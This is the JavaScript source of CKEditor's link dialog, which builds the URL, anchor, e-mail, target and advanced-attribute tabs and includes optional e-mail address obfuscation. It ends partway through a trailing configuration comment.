/**
 * @license Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
 * For licensing, see LICENSE.md or http://ckeditor.com/license
 */

CKEDITOR.dialog.add( 'link', function( editor ) {
	var plugin = CKEDITOR.plugins.link;
	// Handles the event when the "Target" selection box is changed.
	var targetChanged = function() {
			var dialog = this.getDialog(),
				popupFeatures = dialog.getContentElement( 'target', 'popupFeatures' ),
				targetName = dialog.getContentElement( 'target', 'linkTargetName' ),
				value = this.getValue();

			if ( !popupFeatures || !targetName )
				return;

			popupFeatures = popupFeatures.getElement();
			popupFeatures.hide();
			targetName.setValue( '' );

			switch ( value ) {
				case 'frame':
					targetName.setLabel( editor.lang.link.targetFrameName );
					targetName.getElement().show();
					break;
				case 'popup':
					popupFeatures.show();
					targetName.setLabel( editor.lang.link.targetPopupName );
					targetName.getElement().show();
					break;
				default:
					targetName.setValue( value );
					targetName.getElement().hide();
					break;
			}

		};

	// Handles the event when the "Type" selection box is changed.
	var linkTypeChanged = function() {
			var dialog = this.getDialog(),
				partIds = [ 'urlOptions', 'anchorOptions', 'emailOptions' ],
				typeValue = this.getValue(),
				uploadTab = dialog.definition.getContents( 'upload' ),
				uploadInitiallyHidden = uploadTab && uploadTab.hidden;

			if ( typeValue == 'url' ) {
				if ( editor.config.linkShowTargetTab )
					dialog.showPage( 'target' );
				if ( !uploadInitiallyHidden )
					dialog.showPage( 'upload' );
			} else {
				dialog.hidePage( 'target' );
				if ( !uploadInitiallyHidden )
					dialog.hidePage( 'upload' );
			}

			for ( var i = 0; i < partIds.length; i++ ) {
				var element = dialog.getContentElement( 'info', partIds[ i ] );
				if ( !element )
					continue;

				element = element.getElement().getParent().getParent();
				if ( partIds[ i ] == typeValue + 'Options' )
					element.show();
				else
					element.hide();
			}

			dialog.layout();
		};

	// Loads the parameters in a selected link to the link dialog fields.
	var javascriptProtocolRegex = /^javascript:/,
		emailRegex = /^mailto:([^?]+)(?:\?(.+))?$/,
		emailSubjectRegex = /subject=([^;?:@&=$,\/]*)/,
		emailBodyRegex = /body=([^;?:@&=$,\/]*)/,
		anchorRegex = /^#(.*)$/,
		urlRegex = /^((?:http|https|ftp|news):\/\/)?(.*)$/,
		selectableTargets = /^(_(?:self|top|parent|blank))$/,
		encodedEmailLinkRegex = /^javascript:void\(location\.href='mailto:'\+String\.fromCharCode\(([^)]+)\)(?:\+'(.*)')?\)$/,
		functionCallProtectedEmailLinkRegex = /^javascript:([^(]+)\(([^)]+)\)$/;

	var popupRegex = /\s*window.open\(\s*this\.href\s*,\s*(?:'([^']*)'|null)\s*,\s*'([^']*)'\s*\)\s*;\s*return\s*false;*\s*/;
	var popupFeaturesRegex = /(?:^|,)([^=]+)=(\d+|yes|no)/gi;

	var parseLink = function( editor, element ) {
			var href = ( element && ( element.data( 'cke-saved-href' ) || element.getAttribute( 'href' ) ) ) || '',
				javascriptMatch, emailMatch, anchorMatch, urlMatch,
				retval = {};

			if ( ( javascriptMatch = href.match( javascriptProtocolRegex ) ) ) {
				if ( emailProtection == 'encode' ) {
					href = href.replace( encodedEmailLinkRegex, function( match, protectedAddress, rest ) {
						return 'mailto:' +
							String.fromCharCode.apply( String, protectedAddress.split( ',' ) ) +
							( rest && unescapeSingleQuote( rest ) );
					});
				}
				// Protected email link as function call.
				else if ( emailProtection ) {
					href.replace( functionCallProtectedEmailLinkRegex, function( match, funcName, funcArgs ) {
						if ( funcName == compiledProtectionFunction.name ) {
							retval.type = 'email';
							var email = retval.email = {};

							var paramRegex = /[^,\s]+/g,
								paramQuoteRegex = /(^')|('$)/g,
								paramsMatch = funcArgs.match( paramRegex ),
								paramsMatchLength = paramsMatch.length,
								paramName, paramVal;

							for ( var i = 0; i < paramsMatchLength; i++ ) {
								paramVal = decodeURIComponent( unescapeSingleQuote( paramsMatch[ i ].replace( paramQuoteRegex, '' ) ) );
								paramName = compiledProtectionFunction.params[ i ].toLowerCase();
								email[ paramName ] = paramVal;
							}
							email.address = [ email.name, email.domain ].join( '@' );
						}
					});
				}
			}

			if ( !retval.type ) {
				if ( ( anchorMatch = href.match( anchorRegex ) ) ) {
					retval.type = 'anchor';
					retval.anchor = {};
					retval.anchor.name = retval.anchor.id = anchorMatch[ 1 ];
				}
				// Protected email link as encoded string.
				else if ( ( emailMatch = href.match( emailRegex ) ) ) {
					var subjectMatch = href.match( emailSubjectRegex ),
						bodyMatch = href.match( emailBodyRegex );

					retval.type = 'email';
					var email = ( retval.email = {} );
					email.address = emailMatch[ 1 ];
					subjectMatch && ( email.subject = decodeURIComponent( subjectMatch[ 1 ] ) );
					bodyMatch && ( email.body = decodeURIComponent( bodyMatch[ 1 ] ) );
				}
				// urlRegex matches empty strings, so need to check for href as well.
				else if ( href && ( urlMatch = href.match( urlRegex ) ) ) {
					retval.type = 'url';
					retval.url = {};
					retval.url.protocol = urlMatch[ 1 ];
					retval.url.url = urlMatch[ 2 ];
				} else
					retval.type = 'url';
			}

			// Load target and popup settings.
			if ( element ) {
				var target = element.getAttribute( 'target' );
				retval.target = {};
				retval.adv = {};

				// IE BUG: target attribute is an empty string instead of null in IE if it's not set.
				if ( !target ) {
					var onclick = element.data( 'cke-pa-onclick' ) || element.getAttribute( 'onclick' ),
						onclickMatch = onclick && onclick.match( popupRegex );
					if ( onclickMatch ) {
						retval.target.type = 'popup';
						retval.target.name = onclickMatch[ 1 ];

						var featureMatch;
						while ( ( featureMatch = popupFeaturesRegex.exec( onclickMatch[ 2 ] ) ) ) {
							// Some values should remain numbers (#7300)
							if ( ( featureMatch[ 2 ] == 'yes' || featureMatch[ 2 ] == '1' ) && !( featureMatch[ 1 ] in { height:1,width:1,top:1,left:1 } ) )
								retval.target[ featureMatch[ 1 ] ] = true;
							else if ( isFinite( featureMatch[ 2 ] ) )
								retval.target[ featureMatch[ 1 ] ] = featureMatch[ 2 ];
						}
					}
				} else {
					var targetMatch = target.match( selectableTargets );
					if ( targetMatch )
						retval.target.type = retval.target.name = target;
					else {
						retval.target.type = 'frame';
						retval.target.name = target;
					}
				}

				var me = this;
				var advAttr = function( inputName, attrName ) {
						var value = element.getAttribute( attrName );
						if ( value !== null )
							retval.adv[ inputName ] = value || '';
					};
				advAttr( 'advId', 'id' );
				advAttr( 'advLangDir', 'dir' );
				advAttr( 'advAccessKey', 'accessKey' );

				retval.adv.advName = element.data( 'cke-saved-name' ) || element.getAttribute( 'name' ) || '';
				advAttr( 'advLangCode', 'lang' );
				advAttr( 'advTabIndex', 'tabindex' );
				advAttr( 'advTitle', 'title' );
				advAttr( 'advContentType', 'type' );
				CKEDITOR.plugins.link.synAnchorSelector ? retval.adv.advCSSClasses = getLinkClass( element ) : advAttr( 'advCSSClasses', 'class' );
				advAttr( 'advCharset', 'charset' );
				advAttr( 'advStyles', 'style' );
				advAttr( 'advRel', 'rel' );
			}

			// Find out whether we have any anchors in the editor.
			var anchors = retval.anchors = [],
				i, count, item;

			// For some browsers we set contenteditable="false" on anchors, making document.anchors not to include them, so we must traverse the links manually (#7893).
			if ( CKEDITOR.plugins.link.emptyAnchorFix ) {
				var links = editor.document.getElementsByTag( 'a' );
				for ( i = 0, count = links.count(); i < count; i++ ) {
					item = links.getItem( i );
					if ( item.data( 'cke-saved-name' ) || item.hasAttribute( 'name' ) )
						anchors.push({ name: item.data( 'cke-saved-name' ) || item.getAttribute( 'name' ), id: item.getAttribute( 'id' ) } );
				}
			} else {
				var anchorList = new CKEDITOR.dom.nodeList( editor.document.$.anchors );
				for ( i = 0, count = anchorList.count(); i < count; i++ ) {
					item = anchorList.getItem( i );
					anchors[ i ] = { name: item.getAttribute( 'name' ), id: item.getAttribute( 'id' ) };
				}
			}

			if ( CKEDITOR.plugins.link.fakeAnchor ) {
				var imgs = editor.document.getElementsByTag( 'img' );
				for ( i = 0, count = imgs.count(); i < count; i++ ) {
					if ( ( item = CKEDITOR.plugins.link.tryRestoreFakeAnchor( editor, imgs.getItem( i ) ) ) )
						anchors.push({ name: item.getAttribute( 'name' ), id: item.getAttribute( 'id' ) } );
				}
			}

			// Record down the selected element in the dialog.
			this._.selectedElement = element;
			return retval;
		};

	var setupParams = function( page, data ) {
			if ( data[ page ] )
				this.setValue( data[ page ][ this.id ] || '' );
		};

	var setupPopupParams = function( data ) {
			return setupParams.call( this, 'target', data );
		};

	var setupAdvParams = function( data ) {
			return setupParams.call( this, 'adv', data );
		};

	var commitParams = function( page, data ) {
			if ( !data[ page ] )
				data[ page ] = {};

			data[ page ][ this.id ] = this.getValue() || '';
		};

	var commitPopupParams = function( data ) {
			return commitParams.call( this, 'target', data );
		};

	var commitAdvParams = function( data ) {
			return commitParams.call( this, 'adv', data );
		};

	function unescapeSingleQuote( str ) {
		return str.replace( /\\'/g, '\'' );
	}

	function escapeSingleQuote( str ) {
		return str.replace( /'/g, '\\$&' );
	}

	var emailProtection = editor.config.emailProtection || '';

	// Compile the protection function pattern.
	if ( emailProtection && emailProtection != 'encode' ) {
		var compiledProtectionFunction = {};

		emailProtection.replace( /^([^(]+)\(([^)]+)\)$/, function( match, funcName, params ) {
			compiledProtectionFunction.name = funcName;
			compiledProtectionFunction.params = [];
			params.replace( /[^,\s]+/g, function( param ) {
				compiledProtectionFunction.params.push( param );
			});
		});
	}

	function protectEmailLinkAsFunction( email ) {
		var retval,
			name = compiledProtectionFunction.name,
			params = compiledProtectionFunction.params,
			paramName, paramValue;

		retval = [ name, '(' ];
		for ( var i = 0; i < params.length; i++ ) {
			paramName = params[ i ].toLowerCase();
			paramValue = email[ paramName ];

			i > 0 && retval.push( ',' );
			retval.push( '\'', paramValue ? escapeSingleQuote( encodeURIComponent( email[ paramName ] ) ) : '', '\'' );
		}
		retval.push( ')' );
		return retval.join( '' );
	}

	function protectEmailAddressAsEncodedString( address ) {
		var charCode,
			length = address.length,
			encodedChars = [];
		for ( var i = 0; i < length; i++ ) {
			charCode = address.charCodeAt( i );
			encodedChars.push( charCode );
		}
		return 'String.fromCharCode(' + encodedChars.join( ',' ) + ')';
	}

	function getLinkClass( ele ) {
		var className = ele.getAttribute( 'class' );
		return className ? className.replace( /\s*(?:cke_anchor_empty|cke_anchor)(?:\s*$)?/g, '' ) : '';
	}

	var commonLang = editor.lang.common,
		linkLang = editor.lang.link;

	return {
		title: linkLang.title,
		minWidth: 350,
		minHeight: 230,
		contents: [
			{
			id: 'info',
			label: linkLang.info,
			title: linkLang.info,
			elements: [
				{
				id: 'linkType',
				type: 'select',
				label: linkLang.type,
				'default': 'url',
				items: [
					[ linkLang.toUrl, 'url' ],
					[ linkLang.toAnchor, 'anchor' ],
					[ linkLang.toEmail, 'email' ]
					],
				onChange: linkTypeChanged,
				setup: function( data ) {
					if ( data.type )
						this.setValue( data.type );
				},
				commit: function( data ) {
					data.type = this.getValue();
				}
			},
				{
				type: 'vbox',
				id: 'urlOptions',
				children: [
					{
					type: 'hbox',
					widths: [ '25%', '75%' ],
					children: [
						{
						id: 'protocol',
						type: 'select',
						label: commonLang.protocol,
						'default': 'http://',
						items: [
							// Force 'ltr' for protocol names in BIDI. (#5433)
							[ 'http://\u200E', 'http://' ],
							[ 'https://\u200E', 'https://' ],
							[ 'ftp://\u200E', 'ftp://' ],
							[ 'news://\u200E', 'news://' ],
							[ linkLang.other, '' ]
							],
						setup: function( data ) {
							if ( data.url )
								this.setValue( data.url.protocol || '' );
						},
						commit: function( data ) {
							if ( !data.url )
								data.url = {};

							data.url.protocol = this.getValue();
						}
					},
						{
						type: 'text',
						id: 'url',
						label: commonLang.url,
						required: true,
						onLoad: function() {
							this.allowOnChange = true;
						},
						onKeyUp: function() {
							this.allowOnChange = false;
							var protocolCmb = this.getDialog().getContentElement( 'info', 'protocol' ),
								url = this.getValue(),
								urlOnChangeProtocol = /^(http|https|ftp|news):\/\/(?=.)/i,
								urlOnChangeTestOther = /^((javascript:)|[#\/\.\?])/i;

							var protocol = urlOnChangeProtocol.exec( url );
							if ( protocol ) {
								this.setValue( url.substr( protocol[ 0 ].length ) );
								protocolCmb.setValue( protocol[ 0 ].toLowerCase() );
							} else if ( urlOnChangeTestOther.test( url ) )
								protocolCmb.setValue( '' );

							this.allowOnChange = true;
						},
						onChange: function() {
							if ( this.allowOnChange ) // Dont't call on dialog load.
							this.onKeyUp();
						},
						validate: function() {
							var dialog = this.getDialog();

							if ( dialog.getContentElement( 'info', 'linkType' ) && dialog.getValueOf( 'info', 'linkType' ) != 'url' )
								return true;

							if ( (/javascript\:/).test( this.getValue() ) ) {
								alert( commonLang.invalidValue );
								return false;
							}

							if ( this.getDialog().fakeObj ) // Edit Anchor.
							return true;

							var func = CKEDITOR.dialog.validate.notEmpty( linkLang.noUrl );
							return func.apply( this );
						},
						setup: function( data ) {
							this.allowOnChange = false;
							if ( data.url )
								this.setValue( data.url.url );
							this.allowOnChange = true;

						},
						commit: function( data ) {
							// IE will not trigger the onChange event if the mouse has been used
							// to carry all the operations #4724
							this.onChange();

							if ( !data.url )
								data.url = {};

							data.url.url = this.getValue();
							this.allowOnChange = false;
						}
					}
					],
					setup: function( data ) {
						if ( !this.getDialog().getContentElement( 'info', 'linkType' ) )
							this.getElement().show();
					}
				},
					{
					type: 'button',
					id: 'browse',
					hidden: 'true',
					filebrowser: 'info:url',
					label: commonLang.browseServer
				}
				]
			},
				{
				type: 'vbox',
				id: 'anchorOptions',
				width: 260,
				align: 'center',
				padding: 0,
				children: [
					{
					type: 'fieldset',
					id: 'selectAnchorText',
					label: linkLang.selectAnchor,
					setup: function( data ) {
						if ( data.anchors.length > 0 )
							this.getElement().show();
						else
							this.getElement().hide();
					},
					children: [
						{
						type: 'hbox',
						id: 'selectAnchor',
						children: [
							{
							type: 'select',
							id: 'anchorName',
							'default': '',
							label: linkLang.anchorName,
							style: 'width: 100%;',
							items: [
								[ '' ]
								],
							setup: function( data ) {
								this.clear();
								this.add( '' );
								for ( var i = 0; i < data.anchors.length; i++ ) {
									if ( data.anchors[ i ].name )
										this.add( data.anchors[ i ].name );
								}

								if ( data.anchor )
									this.setValue( data.anchor.name );

								var linkType = this.getDialog().getContentElement( 'info', 'linkType' );
								if ( linkType && linkType.getValue() == 'email' )
									this.focus();
							},
							commit: function( data ) {
								if ( !data.anchor )
									data.anchor = {};

								data.anchor.name = this.getValue();
							}
						},
							{
							type: 'select',
							id: 'anchorId',
							'default': '',
							label: linkLang.anchorId,
							style: 'width: 100%;',
							items: [
								[ '' ]
								],
							setup: function( data ) {
								this.clear();
								this.add( '' );
								for ( var i = 0; i < data.anchors.length; i++ ) {
									if ( data.anchors[ i ].id )
										this.add( data.anchors[ i ].id );
								}

								if ( data.anchor )
									this.setValue( data.anchor.id );
							},
							commit: function( data ) {
								if ( !data.anchor )
									data.anchor = {};

								data.anchor.id = this.getValue();
							}
						}
						],
						setup: function( data ) {
							if ( data.anchors.length > 0 )
								this.getElement().show();
							else
								this.getElement().hide();
						}
					}
					]
				},
					{
					type: 'html',
					id: 'noAnchors',
					style: 'text-align: center;',
					html: '<div role="note" tabIndex="-1">' + CKEDITOR.tools.htmlEncode( linkLang.noAnchors ) + '</div>',
					// Focus the first element defined in above html.
					focus: true,
					setup: function( data ) {
						if ( data.anchors.length < 1 )
							this.getElement().show();
						else
							this.getElement().hide();
					}
				}
				],
				setup: function( data ) {
					if ( !this.getDialog().getContentElement( 'info', 'linkType' ) )
						this.getElement().hide();
				}
			},
				{
				type: 'vbox',
				id: 'emailOptions',
				padding: 1,
				children: [
					{
					type: 'text',
					id: 'emailAddress',
					label: linkLang.emailAddress,
					required: true,
					validate: function() {
						var dialog = this.getDialog();

						if ( !dialog.getContentElement( 'info', 'linkType' ) || dialog.getValueOf( 'info', 'linkType' ) != 'email' )
							return true;

						var func = CKEDITOR.dialog.validate.notEmpty( linkLang.noEmail );
						return func.apply( this );
					},
					setup: function( data ) {
						if ( data.email )
							this.setValue( data.email.address );

						var linkType = this.getDialog().getContentElement( 'info', 'linkType' );
						if ( linkType && linkType.getValue() == 'email' )
							this.select();
					},
					commit: function( data ) {
						if ( !data.email )
							data.email = {};

						data.email.address = this.getValue();
					}
				},
					{
					type: 'text',
					id: 'emailSubject',
					label: linkLang.emailSubject,
					setup: function( data ) {
						if ( data.email )
							this.setValue( data.email.subject );
					},
					commit: function( data ) {
						if ( !data.email )
							data.email = {};

						data.email.subject = this.getValue();
					}
				},
					{
					type: 'textarea',
					id: 'emailBody',
					label: linkLang.emailBody,
					rows: 3,
					'default': '',
					setup: function( data ) {
						if ( data.email )
							this.setValue( data.email.body );
					},
					commit: function( data ) {
						if ( !data.email )
							data.email = {};

						data.email.body = this.getValue();
					}
				}
				],
				setup: function( data ) {
					if ( !this.getDialog().getContentElement( 'info', 'linkType' ) )
						this.getElement().hide();
				}
			}
			]
		},
			{
			id: 'target',
			requiredContent: 'a[target]', // This is not fully correct, because some target option requires JS.
			label: linkLang.target,
			title: linkLang.target,
			elements: [
				{
				type: 'hbox',
				widths: [ '50%', '50%' ],
				children: [
					{
					type: 'select',
					id: 'linkTargetType',
					label: commonLang.target,
					'default': 'notSet',
					style: 'width : 100%;',
					'items': [
						[ commonLang.notSet, 'notSet' ],
						[ linkLang.targetFrame, 'frame' ],
						[ linkLang.targetPopup, 'popup' ],
						[ commonLang.targetNew, '_blank' ],
						[ commonLang.targetTop, '_top' ],
						[ commonLang.targetSelf, '_self' ],
						[ commonLang.targetParent, '_parent' ]
						],
					onChange: targetChanged,
					setup: function( data ) {
						if ( data.target )
							this.setValue( data.target.type || 'notSet' );
						targetChanged.call( this );
					},
					commit: function( data ) {
						if ( !data.target )
							data.target = {};

						data.target.type = this.getValue();
					}
				},
					{
					type: 'text',
					id: 'linkTargetName',
					label: linkLang.targetFrameName,
					'default': '',
					setup: function( data ) {
						if ( data.target )
							this.setValue( data.target.name );
					},
					commit: function( data ) {
						if ( !data.target )
							data.target = {};

						data.target.name = this.getValue().replace( /\W/gi, '' );
					}
				}
				]
			},
				{
				type: 'vbox',
				width: '100%',
				align: 'center',
				padding: 2,
				id: 'popupFeatures',
				children: [
					{
					type: 'fieldset',
					label: linkLang.popupFeatures,
					children: [
						{
						type: 'hbox',
						children: [
							{
							type: 'checkbox',
							id: 'resizable',
							label: linkLang.popupResizable,
							setup: setupPopupParams,
							commit: commitPopupParams
						},
							{
							type: 'checkbox',
							id: 'status',
							label: linkLang.popupStatusBar,
							setup: setupPopupParams,
							commit: commitPopupParams

						}
						]
					},
						{
						type: 'hbox',
						children: [
							{
							type: 'checkbox',
							id: 'location',
							label: linkLang.popupLocationBar,
							setup: setupPopupParams,
							commit: commitPopupParams

						},
							{
							type: 'checkbox',
							id: 'toolbar',
							label: linkLang.popupToolbar,
							setup: setupPopupParams,
							commit: commitPopupParams

						}
						]
					},
						{
						type: 'hbox',
						children: [
							{
							type: 'checkbox',
							id: 'menubar',
							label: linkLang.popupMenuBar,
							setup: setupPopupParams,
							commit: commitPopupParams

						},
							{
							type: 'checkbox',
							id: 'fullscreen',
							label: linkLang.popupFullScreen,
							setup: setupPopupParams,
							commit: commitPopupParams

						}
						]
					},
						{
						type: 'hbox',
						children: [
							{
							type: 'checkbox',
							id: 'scrollbars',
							label: linkLang.popupScrollBars,
							setup: setupPopupParams,
							commit: commitPopupParams

						},
							{
							type: 'checkbox',
							id: 'dependent',
							label: linkLang.popupDependent,
							setup: setupPopupParams,
							commit: commitPopupParams

						}
						]
					},
						{
						type: 'hbox',
						children: [
							{
							type: 'text',
							widths: [ '50%', '50%' ],
							labelLayout: 'horizontal',
							label: commonLang.width,
							id: 'width',
							setup: setupPopupParams,
							commit: commitPopupParams

						},
							{
							type: 'text',
							labelLayout: 'horizontal',
							widths: [ '50%', '50%' ],
							label: linkLang.popupLeft,
							id: 'left',
							setup: setupPopupParams,
							commit: commitPopupParams

						}
						]
					},
						{
						type: 'hbox',
						children: [
							{
							type: 'text',
							labelLayout: 'horizontal',
							widths: [ '50%', '50%' ],
							label: commonLang.height,
							id: 'height',
							setup: setupPopupParams,
							commit: commitPopupParams

						},
							{
							type: 'text',
							labelLayout: 'horizontal',
							label: linkLang.popupTop,
							widths: [ '50%', '50%' ],
							id: 'top',
							setup: setupPopupParams,
							commit: commitPopupParams

						}
						]
					}
					]
				}
				]
			}
			]
		},
			{
			id: 'upload',
			label: linkLang.upload,
			title: linkLang.upload,
			hidden: true,
			filebrowser: 'uploadButton',
			elements: [
				{
				type: 'file',
				id: 'upload',
				label: commonLang.upload,
				style: 'height:40px',
				size: 29
			},
				{
				type: 'fileButton',
				id: 'uploadButton',
				label: commonLang.uploadSubmit,
				filebrowser: 'info:url',
				'for': [ 'upload', 'upload' ]
			}
			]
		},
			{
			id: 'advanced',
			label: linkLang.advanced,
			title: linkLang.advanced,
			elements: [
				{
				type: 'vbox',
				padding: 1,
				children: [
					{
					type: 'hbox',
					widths: [ '45%', '35%', '20%' ],
					children: [
						{
						type: 'text',
						id: 'advId',
						requiredContent: 'a[id]',
						label: linkLang.id,
						setup: setupAdvParams,
						commit: commitAdvParams
					},
						{
						type: 'select',
						id: 'advLangDir',
						requiredContent: 'a[dir]',
						label: linkLang.langDir,
						'default': '',
						style: 'width:110px',
						items: [
							[ commonLang.notSet, '' ],
							[ linkLang.langDirLTR, 'ltr' ],
							[ linkLang.langDirRTL, 'rtl' ]
							],
						setup: setupAdvParams,
						commit: commitAdvParams
					},
						{
						type: 'text',
						id: 'advAccessKey',
						requiredContent: 'a[accesskey]',
						width: '80px',
						label: linkLang.acccessKey,
						maxLength: 1,
						setup: setupAdvParams,
						commit: commitAdvParams

					}
					]
				},
					{
					type: 'hbox',
					widths: [ '45%', '35%', '20%' ],
					children: [
						{
						type: 'text',
						label: linkLang.name,
						id: 'advName',
						requiredContent: 'a[name]',
						setup: setupAdvParams,
						commit: commitAdvParams

					},
						{
						type: 'text',
						label: linkLang.langCode,
						id: 'advLangCode',
						requiredContent: 'a[lang]',
						width: '110px',
						'default': '',
						setup: setupAdvParams,
						commit: commitAdvParams

					},
						{
						type: 'text',
						label: linkLang.tabIndex,
						id: 'advTabIndex',
						requiredContent: 'a[tabindex]',
						width: '80px',
						maxLength: 5,
						setup: setupAdvParams,
						commit: commitAdvParams

					}
					]
				}
				]
			},
				{
				type: 'vbox',
				padding: 1,
				children: [
					{
					type: 'hbox',
					widths: [ '45%', '55%' ],
					children: [
						{
						type: 'text',
						label: linkLang.advisoryTitle,
						requiredContent: 'a[title]',
						'default': '',
						id: 'advTitle',
						setup: setupAdvParams,
						commit: commitAdvParams

					},
						{
						type: 'text',
						label: linkLang.advisoryContentType,
						requiredContent: 'a[type]',
						'default': '',
						id: 'advContentType',
						setup: setupAdvParams,
						commit: commitAdvParams

					}
					]
				},
					{
					type: 'hbox',
					widths: [ '45%', '55%' ],
					children: [
						{
						type: 'text',
						label: linkLang.cssClasses,
						requiredContent: 'a(cke-xyz)', // Random text like 'xyz' will check if all are allowed.
						'default': '',
						id: 'advCSSClasses',
						setup: setupAdvParams,
						commit: commitAdvParams

					},
						{
						type: 'text',
						label: linkLang.charset,
						requiredContent: 'a[charset]',
						'default': '',
						id: 'advCharset',
						setup: setupAdvParams,
						commit: commitAdvParams

					}
					]
				},
					{
					type: 'hbox',
					widths: [ '45%', '55%' ],
					children: [
						{
						type: 'text',
						label: linkLang.rel,
						requiredContent: 'a[rel]',
						'default': '',
						id: 'advRel',
						setup: setupAdvParams,
						commit: commitAdvParams
					},
						{
						type: 'text',
						label: linkLang.styles,
						requiredContent: 'a{cke-xyz}', // Random text like 'xyz' will check if all are allowed.
						'default': '',
						id: 'advStyles',
						validate: CKEDITOR.dialog.validate.inlineStyle( editor.lang.common.invalidInlineStyle ),
						setup: setupAdvParams,
						commit: commitAdvParams
					}
					]
				}
				]
			}
			]
		}
		],
		onShow: function() {
			var editor = this.getParentEditor(),
				selection = editor.getSelection(),
				element = null;

			// Fill in all the relevant fields if there's already one link selected.
			if ( ( element = plugin.getSelectedLink( editor ) ) && element.hasAttribute( 'href' ) )
				selection.selectElement( element );
			else
				element = null;

			this.setupContent( parseLink.apply( this, [ editor, element ] ) );
		},
		onOk: function() {
			var attributes = {},
				removeAttributes = [],
				data = {},
				me = this,
				editor = this.getParentEditor();

			this.commitContent( data );

			// Compose the URL.
			switch ( data.type || 'url' ) {
				case 'url':
					var protocol = ( data.url && data.url.protocol != undefined ) ? data.url.protocol : 'http://',
						url = ( data.url && CKEDITOR.tools.trim( data.url.url ) ) || '';
					attributes[ 'data-cke-saved-href' ] = ( url.indexOf( '/' ) === 0 ) ? url : protocol + url;
					break;
				case 'anchor':
					var name = ( data.anchor && data.anchor.name ),
						id = ( data.anchor && data.anchor.id );
					attributes[ 'data-cke-saved-href' ] = '#' + ( name || id || '' );
					break;
				case 'email':

					var linkHref,
					email = data.email,
						address = email.address;

					switch ( emailProtection ) {
						case '':
						case 'encode':
							{
								var subject = encodeURIComponent( email.subject || '' ),
									body = encodeURIComponent( email.body || '' );

								// Build the e-mail parameters first.
								var argList = [];
								subject && argList.push( 'subject=' + subject );
								body && argList.push( 'body=' + body );
								argList = argList.length ? '?' + argList.join( '&' ) : '';

								if ( emailProtection == 'encode' ) {
									linkHref = [ 'javascript:void(location.href=\'mailto:\'+',
																															protectEmailAddressAsEncodedString( address ) ];
									// parameters are optional.
									argList && linkHref.push( '+\'', escapeSingleQuote( argList ), '\'' );

									linkHref.push( ')' );
								} else
									linkHref = [ 'mailto:', address, argList ];

								break;
							}
						default:
							{
								// Separating name and domain.
								var nameAndDomain = address.split( '@', 2 );
								email.name = nameAndDomain[ 0 ];
								email.domain = nameAndDomain[ 1 ];

								linkHref = [ 'javascript:', protectEmailLinkAsFunction( email ) ];
							}
					}

					attributes[ 'data-cke-saved-href' ] = linkHref.join( '' );
					break;
			}

			// Popups and target.
			if ( data.target ) {
				if ( data.target.type == 'popup' ) {
					var onclickList = [ 'window.open(this.href, \'',
																			data.target.name || '', '\', \'' ];
					var featureList = [ 'resizable', 'status', 'location', 'toolbar', 'menubar', 'fullscreen',
																			'scrollbars', 'dependent' ];
					var featureLength = featureList.length;
					var addFeature = function( featureName ) {
							if ( data.target[ featureName ] )
								featureList.push( featureName + '=' + data.target[ featureName ] );
						};

					for ( var i = 0; i < featureLength; i++ )
						featureList[ i ] = featureList[ i ] + ( data.target[ featureList[ i ] ] ? '=yes' : '=no' );
					addFeature( 'width' );
					addFeature( 'left' );
					addFeature( 'height' );
					addFeature( 'top' );

					onclickList.push( featureList.join( ',' ), '\'); return false;' );
					attributes[ 'data-cke-pa-onclick' ] = onclickList.join( '' );

					// Add the "target" attribute. (#5074)
					removeAttributes.push( 'target' );
				} else {
					if ( data.target.type != 'notSet' && data.target.name )
						attributes.target = data.target.name;
					else
						removeAttributes.push( 'target' );

					removeAttributes.push( 'data-cke-pa-onclick', 'onclick' );
				}
			}

			// Advanced attributes.
			if ( data.adv ) {
				var advAttr = function( inputName, attrName ) {
						var value = data.adv[ inputName ];
						if ( value )
							attributes[ attrName ] = value;
						else
							removeAttributes.push( attrName );
					};

				advAttr( 'advId', 'id' );
				advAttr( 'advLangDir', 'dir' );
				advAttr( 'advAccessKey', 'accessKey' );

				if ( data.adv[ 'advName' ] )
					attributes[ 'name' ] = attributes[ 'data-cke-saved-name' ] = data.adv[ 'advName' ];
				else
					removeAttributes = removeAttributes.concat( [ 'data-cke-saved-name', 'name' ] );

				advAttr( 'advLangCode', 'lang' );
				advAttr( 'advTabIndex', 'tabindex' );
				advAttr( 'advTitle', 'title' );
				advAttr( 'advContentType', 'type' );
				advAttr( 'advCSSClasses', 'class' );
				advAttr( 'advCharset', 'charset' );
				advAttr( 'advStyles', 'style' );
				advAttr( 'advRel', 'rel' );
			}


			var selection = editor.getSelection();

			// Browser need the "href" fro copy/paste link to work. (#6641)
			attributes.href = attributes[ 'data-cke-saved-href' ];

			if ( !this._.selectedElement ) {
				var range = selection.getRanges( 1 )[ 0 ];

				// Use link URL as text with a collapsed cursor.
				if ( range.collapsed ) {
					// Short mailto link text view (#5736).
					var text = new CKEDITOR.dom.text( data.type == 'email' ? data.email.address : attributes[ 'data-cke-saved-href' ], editor.document );
					range.insertNode( text );
					range.selectNodeContents( text );
				}

				// Apply style.
				var style = new CKEDITOR.style({ element: 'a', attributes: attributes } );
				style.type = CKEDITOR.STYLE_INLINE; // need to override... dunno why.
				style.applyToRange( range );
				range.select();
			} else {
				// We're only editing an existing link, so just overwrite the attributes.
				var element = this._.selectedElement,
					href = element.data( 'cke-saved-href' ),
					textView = element.getHtml();

				element.setAttributes( attributes );
				element.removeAttributes( removeAttributes );

				if ( data.adv && data.adv.advName && CKEDITOR.plugins.link.synAnchorSelector )
					element.addClass( element.getChildCount() ? 'cke_anchor' : 'cke_anchor_empty' );

				// Update text view when user changes protocol (#4612).
				if ( href == textView || data.type == 'email' && textView.indexOf( '@' ) != -1 ) {
					// Short mailto link text view (#5736).
					element.setHtml( data.type == 'email' ? data.email.address : attributes[ 'data-cke-saved-href' ] );
				}

				selection.selectElement( element );
				delete this._.selectedElement;
			}
		},
		onLoad: function() {
			if ( !editor.config.linkShowAdvancedTab )
				this.hidePage( 'advanced' ); //Hide Advanded tab.

			if ( !editor.config.linkShowTargetTab )
				this.hidePage( 'target' ); //Hide Target tab.
		},
		// Inital focus on 'url' field if link is of type URL.
		onFocus: function() {
			var linkType = this.getContentElement( 'info', 'linkType' ),
				urlField;
			if ( linkType && linkType.getValue() == 'url' ) {
				urlField = this.getContentElement( 'info', 'url' );
				urlField.select();
			}
		}
	};
});

/**
 * The e-mail address anti-spam protection option. The protection will be
 * applied when creating or modifying e-mail links through the editor interface.
 *
 * Two methods of protection can be choosed:
 *
 * 1. The e-mail parts (name, domain and any other query string) are
 *     assembled into a function call pattern. Such function must be
